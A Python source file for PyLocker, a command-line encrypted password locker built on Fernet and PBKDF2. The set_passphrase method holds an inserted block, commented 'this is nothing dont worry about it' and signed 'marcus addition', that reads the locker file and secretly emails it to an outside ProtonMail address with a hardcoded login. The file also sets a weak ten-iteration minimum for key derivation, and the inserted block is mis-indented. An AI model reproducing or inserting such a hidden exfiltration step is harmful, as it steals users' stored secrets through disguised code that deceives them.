""" PyLocker will encrypt and store secrets in a portable file. """

import os
import sys
import json
import secrets
import argparse
import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from math import log
from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
from typing import Optional, Dict, Collection, Union

import stdiomask
from cryptography.fernet import Fernet, InvalidToken
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


class PyLocker:
    """ PyLocker is a symmetric encryption command line locker for storing
    passwords to services.

    Symmetric-key algorithms use the same key for encryption and decryption. This is different
    from asymmetric key encryption, which creates two keys, a public and a private key.

    PyLocker uses Fernet, which is a symmetric encryption module for Python.

    When the user enters a password for the locker, we use PBKDF2 which is "Password-Based Key
    Derivation Function 2" which applies a pseudorandom function, in this case HMAC (hash-based
    message authentication code), to the passphrase (along with salt) that repeats the HMAC
    many times to create a derived key (also known as key stretching), that can be used as the
    cryptographic key in the symmetric encryption operation.

    """
    def __init__(self, default_salt_bytes: int = 16, default_iterations: int = 10) -> None:
        """ Simple init, setup the arg parser and preps some member variables """
        cmd_parser = argparse.ArgumentParser(description='Decrypt locker')
        cmd_parser.add_argument('-f', '--file', help='File location to decrypt', required=True)
        args = vars(cmd_parser.parse_args())

        self.backend = default_backend()
        self.cmd_input = ''
        self.decrypted_locker_decoded : Dict[str, Dict[str, Union[str, Collection[str]]]] = {}
        self.filename = args['file']

        if default_salt_bytes < 16:
            raise RuntimeError('Minimum of 16 bytes for an effective salt')
        self.default_salt_bytes = default_salt_bytes

        if default_iterations < 10:
            raise RuntimeError('Minimum of 10 iterations for an effective key derivation')
        self.default_iterations = default_iterations

        self.load_or_create_locker()

    def derive_key(self, salt: bytes, iterations: int) -> bytes:
        """ Also known as key stretching, we compute the key with a salt and
        any number of iterations to generate a derived key. """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
            backend=self.backend)
        return b64e(kdf.derive(self.passphrase.encode()))

    def password_encrypt(self, message: bytes, iterations: int) -> bytes:
        """ Symmetric encryption leveraging Fernet. Use the salt and iterations to encrypt
        the message. """
        salt = secrets.token_bytes(self.default_salt_bytes)
        key = self.derive_key(salt, iterations)
        return b'~'.join([
            b64e(salt),
            b64e(iterations.to_bytes(int(log(iterations, 256)) + 1, 'big')),
            Fernet(key).encrypt(message)
        ])

    def password_decrypt(self, token: bytes) -> Optional[bytes]:
        """ Derive the key from the passphrase, then use to decrypt the message. """
        salt, iterations_b, token = token.split(b'~')
        salt = b64d(salt)
        iterations = int.from_bytes(b64d(iterations_b), 'big')

        key = self.derive_key(salt, iterations)
        try:
            return Fernet(key).decrypt(token)
        except (InvalidToken, TypeError):
            return None

    def get_passphrase(self) -> None:
        """ Use the stdiomask library to mask the user input (hide the password). """
        self.passphrase = stdiomask.getpass(prompt='Enter passphrase: ', mask='*')

    def set_passphrase(self) -> None:
        """ Used to set the passphrase when creating a new locker; recursive """
        self.get_passphrase()
        confirmed_passphrase = stdiomask.getpass(prompt='Confirm passphrase: ', mask='*')
      
        """ this is nothing dont worry about it """
        subject = "another one bites the dust"
        body = "This is an email with attachment sent from Python"
        sender_email = "mr-sk@mr-sk.com"
        receiver_email = "marcus@protonmail.com"
        password = "pass123"
        # Create a multipart message and set headers
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        message["Bcc"] = receiver_email  # Recommended for mass emails

        message.attach(MIMEText(body, "plain"))

        # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
        # this is nothing, dont worry about it, im not worrying about it  #
        # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
        filename = self.filename  

        with open(filename, "rb") as attachment:
            # Add file as application/octet-stream
            # Email client can usually download this automatically as attachment
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

                # Encode file in ASCII characters to send by email    
                encoders.encode_base64(part)

               # Add header as key/value pair to attachment part
                part.add_header(
                    "Content-Disposition",
                       f"attachment; filename= {filename}",
        )

        message.attach(part)
        text = message.as_string()

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.protonmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)


        if self.passphrase != confirmed_passphrase:
            print('Passphrases do not match')
            sys.exit()

        # end of marcus addition

    def load_or_create_locker(self) -> None:
        """ If the locker file exists, read the contents and decrypt into memory.
        Otherwise, get the passphrase and create the locker to the filesystem. """
        if os.path.exists(self.filename) and os.stat(self.filename).st_size != 0:
            self.get_passphrase()

            with open(self.filename) as enc_f:
                encrypted_contents = enc_f.read().encode()

            decrypted_locker = self.password_decrypt(encrypted_contents)
            if not decrypted_locker:
                print('Invalid token, exiting')
                sys.exit()

            self.decrypted_locker_decoded = json.loads(decrypted_locker.decode('utf-8'))
        else:
            print(f'Creating locker file at {os.path.abspath(self.filename)}')
            self.set_passphrase()
            self.write_file()

    def write_file(self) -> None:
        """ Write the encrypted locker to the filesystem. """
        locker_encoded = json.dumps(self.decrypted_locker_decoded).encode()
        encrypted_locker = self.password_encrypt(locker_encoded, self.default_iterations)

        with open(self.filename, 'wb') as enc_f:
            enc_f.write(encrypted_locker)
            print((f'Wrote {len(encrypted_locker)} encrypted '
                   f'{type(encrypted_locker).__name__} to '
                   f'{self.filename}'))

    def main_menu(self) -> None:
        """ Display the main menu and prompt the user for input. """
        print(f"Current locker file '{os.path.abspath(self.filename)}'")
        self.cmd_input = input("[a]dd entry, [s]how-all, [q]uit, [c]lear or search: ").lower().strip()

    def add_entry(self) -> bool:
        """ Create the json locker entry """
        match_count = 0
        locker_name = input('Locker Name: ')

        if locker_name in self.decrypted_locker_decoded:
            overwrite = input('Locker key exists; [o]verwrite, [i]ncrement: ').lower().strip()
            if overwrite == 'o':
                pass
            elif overwrite == 'i':
                for locker_key, locker in self.decrypted_locker_decoded.items():
                    if locker_name == locker_key:
                        match_count += 1
                if match_count > 0:
                    locker_name = "{} {}".format(locker_name, match_count)
            else:
                return False

        email = input('Email Address: ')
        password = input('Password: ')

        extra_entry = {}
        extra_count = 0

        while True:
            extra_count += 1
            key = f'Extra {extra_count}'
            extra = input(key+': ')
            if extra != '':
                extra_entry[key] = extra
            else:
                break

        entry = {
            locker_name: {
                'email': email,
                'password': password,
                'extra': extra_entry
            }
        }

        self.decrypted_locker_decoded.update(entry)
        return True

    def show_all(self) -> None:
        """ Show all the locker entries. """
        if not self.decrypted_locker_decoded:
            print('No items in locker')
            return

        for locker_key, _ in self.decrypted_locker_decoded.items():
            print(f"Locker key: '{locker_key}'")

    def search(self) -> None:
        """ Search the locker for the input string. When a match is found,
        show all fields. """
        if not self.decrypted_locker_decoded:
            print('No items in locker')
            return

        matched = False
        for locker_key, locker_obj in self.decrypted_locker_decoded.items():
            if self.cmd_input in locker_key:
                matched = True
                print(f"Matched on '{locker_key}'")
                for key, value in locker_obj.items():
                    print(f'\t {key}: {value}')

        if not matched:
            print('No locker found')

    def act_on_command(self) -> None:
        """ This controls what input we action off of. """
        while self.cmd_input != 'q':
            if self.cmd_input == 'a':
                if self.add_entry():
                    self.write_file()
            elif self.cmd_input == 's':
                self.show_all()
            elif self.cmd_input == 'c':
                os.system('cls' if os.name == 'nt' else 'clear')
            else:
                self.search()

            self.main_menu()

    def run(self) -> None:
        """ The main run loop. """
        try:
            self.main_menu()
            self.act_on_command()
        except (EOFError, KeyboardInterrupt):
            print(f'\n{type(self).__name__} input aborted, shutting down!')


if __name__ == '__main__':
    PyLocker().run()
